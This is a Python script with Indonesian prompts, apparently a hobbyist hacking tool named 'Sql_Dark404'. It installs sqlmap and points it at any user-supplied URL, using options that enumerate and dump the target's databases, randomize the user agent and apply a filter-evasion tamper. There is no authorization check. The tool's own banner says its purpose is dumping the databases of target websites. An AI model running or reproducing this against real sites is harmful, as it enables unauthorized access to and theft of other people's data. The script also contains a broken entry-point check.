import os
import time

# Warna ANSI
R = "\033[91m"  # Merah
G = "\033[92m"  # Hijau
Y = "\033[93m"  # Kuning
B = "\033[94m"  # Biru
P = "\033[95m"  # Ungu
C = "\033[96m"  # Cyan
W = "\033[0m"   # Reset

def bersih():
    os.system("clear")

def print_kz_logo():
    logo = f"""{C}

⣿⣧⣿⣿⣿⣿⡟⢸⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣏⣿⣿
⣿⢸⣿⡏⣿⣿⣹⢸⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿
⣿⢼⡟⣤⣿⣧⣿⣸⣿⣿⣿⣿⣿⣿⣿⢻⣸⣿⢿⣿⣿⣿⣿⣿⣿⡇
⣿⢸⢧⣽⡼⣟⣛⣃⣿⠿⣿⣿⣿⣿⣿⢸⣏⣿⡘⣿⣿⣿⣿⡿⣿⢳
⣿⡜⣸⡿⠷⠿⢿⣿⡼⡟⣼⡿⣿⣿⡿⡼⣿⣞⣆⡄⢭⢟⣻⡇⡿⣾
⡜⣷⢻⣤⣿⡒⠄⠄⠉⣺⣿⣿⣾⣽⣇⣥⡯⠿⠾⣞⣮⣃⢻⣧⣇⣿
⣿⣮⡞⣷⣯⣗⣙⣿⣧⣣⣿⣿⣿⣿⣿⣿⣇⠟⡂⣀⣀⠉⡫⢸⣸⣿  {R}Author : Darkness./x.404{C}
⢿⣿⣿⣮⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣷⣬⣍⣎⣿⣿  tools : Sql_Dark404
⣦⣭⣟⡿⣿⣿⣝⢿⣿⣿⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⣼⣿⣿
⠋⠄⠄⠄⠄⠉⠻⢷⣝⡿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⣼⣿⣿⣿
⠄⠄⠄⠄⠄⠄⠄⠄⢙⢿⣮⡻⣿⣷⣿⣿⠿⣟⡯⢡⣾⣠⣿⣿⣿⣿


Ini adalah tools buatan Darkness404 yang bertujuan untuk mengedump database web
tools ini gabungan dengan sql nnti anda tinggal paste link target terus tools ini
akan meng ngedump web target yg anda kasih.

- darkness404

{W}"""
    print(logo)

def install_sqlmap():
    print(f"{C}Sabar tod, gw cek dulu udah terinstall atau belum SQLMap di Termux lu njing...{W}")
    cek = os.system("sqlmap --version > /dev/null 2>&1")

    if cek != 0:
        print(f"{R}SQLMap lu belom terinstall tod, yauda gw bantu install sabar ya...{W}")
        os.system("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap")
        print(f"{G}WOY manusia, SQLMap lu udah gw installin nih tod!{W}")
    else:
        print(f"{G}SQLMap udah terinstall todd!{W}")

def sqlmap_proo_plerr():
    target = input(f"{P}Masukin target URL lu tod: {W}")
    if not target.strip():
        print(f"{R}Woy target ga boleh kosong lol{W}")
        time.sleep(2)
        return

    print(f"{R}Sedang ngocok pake SQLMap target {target}...{W}")

    sqlmap_command = f"""
python3 sqlmap/sqlmap.py -u "{target}" \\
    --dbs \\
    --dump \\
    --batch \\
    --random-agent \\
    --tamper=space2comment \\
    --union-cols=1-11 \\
    --threads=10 \\
    --risk 2 \\
    --level 3 \\
    --ignore-code=415 \\
    --headers="Content-Type: application/json\\r\\nUser-Agent: Mozilla/5.0" \\
    --data='{{"id":1}}' \\
    -p id
"""

    os.system(sqlmap_command)

def menu():
    print(f"{R}================================================================{W}")
    print(f"{C}1 > SQLMap proo plerr{W}")
    print(f"{C}2 > Install SQLMap{W}")
    print(f"{C}3 > Exit{W}")
    print(f"{R}================================================================{W}")

def main_menu():
    while True:
        print_kz_logo()
        menu()
        pilihan = input(f"{C}Pilih menu: {W}")

        if pilihan == "1":
            sqlmap_proo_plerr()
        elif pilihan == "2":
            install_sqlmap()
        elif pilihan == "3":
            print(f"{R}Keluar...{W}")
            break
        else:
            print(f"{R}Pilihan tidak valid!{W}")
            time.sleep(1)

if name == "main":
    main_menu()